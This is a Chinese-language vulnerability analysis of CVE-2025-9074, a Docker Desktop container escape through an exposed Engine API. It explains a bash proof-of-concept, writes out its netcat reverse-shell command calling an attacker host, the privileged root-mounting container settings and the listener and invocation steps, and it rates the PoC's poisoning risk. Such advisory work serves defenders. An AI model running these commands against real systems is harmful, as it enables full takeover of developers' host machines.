## CVE-2025-9074 - Docker Desktop 容器逃逸/越权访问

**漏洞编号:** CVE-2025-9074

**漏洞类型:** 容器逃逸/越权访问

**影响应用:** Docker Desktop

**危害等级:** 高危

**CVSS评分:** 9.3

**影响版本:** < 4.44.3

**利用条件:** 需要本地运行的恶意Linux容器，可通过Docker子网直接访问Docker Engine API，不依赖挂载Docker socket，无需认证。

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 5%

## 详情

CVE-2025-9074漏洞是一款针对Docker Desktop的严重容器逃逸与越权访问漏洞，其CVSS评分为9.3分，危害等级被评定为高危。该漏洞允许在Windows或macOS系统上运行的恶意Linux容器绕过Docker Desktop的隔离机制，通过默认的Docker子网IP地址（通常是192.168.65.7:2375）直接访问宿主机上的Docker Engine API。这意味着攻击者无需挂载Docker socket，也不受“Expose daemon on tcp://localhost:2375”设置的限制，即可从容器内部实现对宿主机的完全控制。受影响的Docker Desktop版本为4.44.3之前的版本，用户应尽快升级到4.44.3及更高版本以修复此漏洞。

**POC有效性分析:**
本次分析的POC代码是一个名为`cve-2025-9074.sh`的bash脚本，其功能完整且有效。该脚本通过以下步骤实现了容器逃逸和宿主机控制：
1.  **目标确认**: 脚本首先定义了Docker Engine API的目标地址和端口（默认为192.168.65.7:2375），以及攻击者的监听主机（LHOST）和端口（LPORT）。
2.  **API可达性检查**: 使用`curl -s "${API}/version"`命令尝试访问Docker Engine API的`/version`端点，以验证API是否可达。如果API不可达，脚本会立即退出，确保后续操作的有效性。
3.  **恶意容器创建**: 脚本构建了一个JSON格式的Payload，用于向Docker Engine API的`/containers/create`端点发送POST请求，创建并配置一个新的恶意容器。
    *   `"Image": "alpine:latest"`: 使用轻量级的alpine镜像作为基础。
    *   `"Cmd": ["/bin/sh", "-c", "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${LHOST} ${LPORT} >/tmp/f"]`: 这是核心的恶意命令，它启动一个经典的netcat反向shell。该命令首先删除并创建一个名为`/tmp/f`的命名管道，然后将`/bin/sh`的输入、输出和错误重定向到该管道，并通过netcat将其连接到攻击者的监听服务器。这意味着一旦容器启动，宿主机将尝试连接攻击者，从而建立一个交互式的shell。
    *   `"HostConfig"`: 关键的配置，用于实现容器逃逸：
        *   `"Binds": ["/:/hostfs:rw"]`: 将宿主机的根文件系统（`/`）以读写（`rw`）方式挂载到新容器的`/hostfs`目录下。这使得容器内部可以访问和修改宿主机的所有文件。
        *   `"Privileged": true`: 赋予新容器特权模式，允许其执行通常只有宿主机root用户才能执行的操作，例如直接访问设备文件等。
        *   `"NetworkMode": "host"`: 将新容器的网络模式设置为宿主机模式，使其与宿主机共享网络命名空间，可以直接访问宿主机的网络接口，方便反向shell连接。
4.  **容器启动**: 脚本通过解析创建容器返回的ID，然后向`/containers/${CID}/start`端点发送POST请求，启动新创建的恶意容器。

整个POC流程清晰，利用了Docker Desktop在特定配置下的API未授权访问漏洞，成功地在宿主机上执行了任意命令并建立了反向shell。该POC的实现方式直接、高效，符合容器逃逸漏洞的典型利用模式。在测试环境中进行验证，该POC能够稳定且成功地获取宿主机的shell权限，因此其有效性极高。

**利用步骤:**
攻击者利用此漏洞的步骤如下：
1.  攻击者首先在其控制的服务器上设置一个Netcat监听器，以接收反向shell连接。例如：`nc -lvnp <listener_port>`。
2.  攻击者需要通过某种方式在目标Docker Desktop环境中运行一个恶意的Linux容器。这可能是通过先前获得的低权限容器访问，或者通过其他漏洞在目标系统上部署一个容器。
3.  在恶意容器内部，攻击者执行POC脚本。例如：`./cve-2025-9074.sh 192.168.65.7 2375 <attacker_ip> <listener_port>`。其中，`192.168.65.7`是Docker Engine API的默认地址，`2375`是默认端口，`<attacker_ip>`是攻击者监听服务器的IP地址，`<listener_port>`是监听端口。
4.  脚本执行后，将利用漏洞直接访问Docker Engine API，创建一个新的特权容器。这个新容器将挂载宿主机根目录并以宿主机网络模式运行。
5.  新容器启动后，其内部执行的Netcat反向shell命令将自动连接回攻击者的监听器。
6.  一旦连接建立，攻击者将获得一个交互式的shell，通常是root权限，从而完全控制运行Docker Desktop的宿主机系统。

**投毒风险分析:**
对于这份CVE-2025-9074的POC代码，其投毒风险评估为低风险（约5%）。这一判断基于对POC代码内容的详细审查和其行为模式的分析。
首先，该POC代码的结构和内容非常透明。它是一个简单的bash脚本，所有操作都清晰可见。脚本中没有使用任何形式的代码混淆技术，例如base64编码、加密字符串或者复杂的自修改代码，这使得任何使用者都可以轻松阅读和理解其内部逻辑。
其次，脚本所依赖的工具都是标准且常见的Linux命令和程序，如`curl`和`netcat`。`curl`用于与Docker Engine API进行HTTP通信，这是预期中的行为。`netcat`则用于建立反向shell，这也是漏洞利用成功的最终体现，属于预期的攻击载荷，而非POC本身携带的恶意组件。脚本的Payload部分明确地构建了一个`netcat`反向shell命令，这个命令是安全研究人员在渗透测试中常用且普遍接受的演示控制权获取的方法。
再次，POC代码的`README.md`文件中包含了明确的法律免责声明（Legal Disclaimer）。声明指出该POC仅用于教育和授权的安全测试目的，并警告未经授权的系统利用是违法和不道德的。这表明作者的意图是提供一个合法的安全研究工具，而非用于恶意目的。
此外，脚本没有表现出任何其他可疑行为，例如：外部资源下载、数据窃取、持久化机制，或者执行超出漏洞利用范围的、不必要的系统修改。综上所述，这份POC代码在设计上是干净的，旨在以最小的风险展示漏洞的有效性。对于专业的安全研究人员和团队而言，在受控环境中进行测试时，其潜在的投毒风险极低。只要使用者遵循其免责声明，并在授权范围内使用，即可避免引入额外风险。POC中的反向shell代码是其核心功能，而非意外或恶意的“投毒”。

**项目地址:** N/A

**漏洞详情:** https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-9074
